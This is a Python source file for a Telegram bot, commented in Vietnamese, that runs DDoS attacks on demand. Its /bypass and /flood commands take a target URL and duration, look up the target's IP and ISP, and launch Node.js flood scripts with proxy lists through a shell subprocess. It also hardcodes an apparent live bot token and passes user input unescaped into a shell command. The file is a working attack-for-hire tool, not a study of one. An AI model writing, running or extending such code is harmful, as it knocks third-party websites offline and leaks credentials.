import subprocess
import asyncio
import requests
import json
import socket
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from urllib import parse

# ID của nhóm cho phép
ALLOWED_CHAT_ID = -1002164954984  # Thay thế bằng ID nhóm của bạn

# ID của người dùng được phép tấn công không giới hạn
ALLOWED_USER_ID = 7371969470  # Thay thế bằng ID người dùng của bạn

# Token của bạn
token_input = '7258312263:AAGIDrOdqp4vyqwMnB4-gALpK0rGjxkH4s4'

# Cờ để kiểm tra xem có ai đang tấn công hay không
is_attacking = False
ongoing_info = {}  # Lưu thông tin ongoing

def escape_html(text):
    escape_characters = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#39;',
        '{': '&#123;',
        '}': '&#125;',
    }
    for char, escape in escape_characters.items():
        text = text.replace(char, escape)
    return text

def get_ip_from_url(url):
    try:
        split_url = parse.urlsplit(url)
        ip = socket.gethostbyname(split_url.netloc)
        return ip
    except socket.error as e:
        print(f"Không thể lấy IP từ URL: {str(e)}")
        return None

def get_isp_info(ip):
    try:
        print(f"Đang lấy thông tin ISP cho IP: {ip}")
        response = requests.get(f"http://ip-api.com/json/{ip}")
        response.raise_for_status()
        print(f"Thông tin ISP nhận được: {response.json()}")
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Không thể lấy thông tin ISP: {str(e)}")
        return None

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attacking

    # Bỏ qua kiểm tra ALLOWED_CHAT_ID
    if is_attacking:
        await update.message.reply_text("Tối đa 1 attack được gửi. Vui lòng đợi trước khi thử lại.")
        return

    try:
        url = context.args[0]
        time = int(context.args[1]) if len(context.args) > 1 else 60

        if time > 60 and update.effective_user.id != ALLOWED_USER_ID:
            await update.message.reply_text("Thời gian tấn công tối đa là 60 giây.")
            return

        ip = get_ip_from_url(url)
        if not ip:
            await update.message.reply_text("Không thể lấy IP từ URL.")
            return

        isp_info = get_isp_info(ip)
        if isp_info:
            isp_info_text = json.dumps(isp_info, indent=2, ensure_ascii=False)
            isp_info_text = escape_html(isp_info_text)
            user_name = update.effective_user.first_name or "Người dùng"
            await update.message.reply_text(
                f"Tấn công đã được gửi!\nThông tin ISP của host {escape_html(url)}\n<pre>{isp_info_text}</pre>\n🔥Tấn công được gửi bởi: {escape_html(user_name)}🔥",
                parse_mode='HTML'
            )

        is_attacking = True
        ongoing_info[update.effective_user.id] = {"url": url, "time_left": time}

        command = f"node thai.js {url} {time} 48 5 proxy.txt" if "/bypass" in update.message.text else f"node stroke.js {url} {time} 64 5 http.txt"

        # Chạy tiến trình DDoS
        process = subprocess.Popen(command, shell=True)
        await asyncio.sleep(1)  # Đợi một chút để tiến trình có thời gian khởi động

        for remaining in range(time, 0, -1):
            ongoing_info[update.effective_user.id]["time_left"] = remaining
            await asyncio.sleep(1)

        process.terminate()
        await update.message.reply_text(f"Đã hoàn thành tấn công {escape_html(url)}.")

    except IndexError:
        await update.message.reply_text("Vui lòng nhập đúng lệnh: /bypass hoặc /flood (url) (time)")

    except ValueError:
        await update.message.reply_text("Thời gian phải là một số nguyên.")

    except Exception as e:
        await update.message.reply_text(f"Đã xảy ra lỗi: {str(e)}")

    finally:
        is_attacking = False
        ongoing_info.pop(update.effective_user.id, None)

async def ongoing(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Bỏ qua kiểm tra ALLOWED_CHAT_ID
    if update.effective_user.id in ongoing_info:
        info = ongoing_info[update.effective_user.id]
        url = info["url"]
        time_left = info["time_left"]
        await update.message.reply_text(f"Tấn công đang diễn ra với URL: {escape_html(url)}. Thời gian còn lại: {time_left} giây.")
    else:
        await update.message.reply_text("Hiện tại không có tấn công nào đang diễn ra.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Bỏ qua kiểm tra ALLOWED_CHAT_ID
    help_info = {
        "/ongoing": "Current running.",
        "/bypass": "[url] [time] --Good Bypass.",
        "/flood": "[url] [time] --Good Flood.",
        "/help": "Show All Methods."
    }

    help_info_json = json.dumps(help_info, indent=2, ensure_ascii=False)
    help_info_text = escape_html(help_info_json)

    await update.message.reply_text(f"<pre>{help_info_text}</pre>", parse_mode='HTML')

def main():
    application = ApplicationBuilder().token(token_input).build()

    application.add_handler(CommandHandler("bypass", attack))
    application.add_handler(CommandHandler("flood", attack))
    application.add_handler(CommandHandler("ongoing", ongoing))
    application.add_handler(CommandHandler("help", help_command))

    print("Bot is running")
    application.run_polling()

if __name__ == '__main__':
    main()
